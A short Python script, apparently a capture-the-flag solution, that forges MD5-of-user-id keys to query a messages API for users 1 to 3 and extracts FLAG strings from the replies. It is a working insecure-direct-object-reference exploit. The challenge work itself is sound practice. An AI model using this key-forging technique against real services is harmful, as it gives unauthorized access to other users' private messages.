import requests
import hashlib
import re

url = 'http://sherlock-message.ru/api/messages.getByDialog'
#uid = '2'
for uid in range(1,4):
    uid=str(uid)
    s = hashlib.md5(uid).hexdigest()
    data = {'user_id': uid, 'key': s}
    r = requests.post(url, data)
    out=r.content
    #out=out.split()
    flag = re.findall('FLAG{\w+}',out)
    print flag
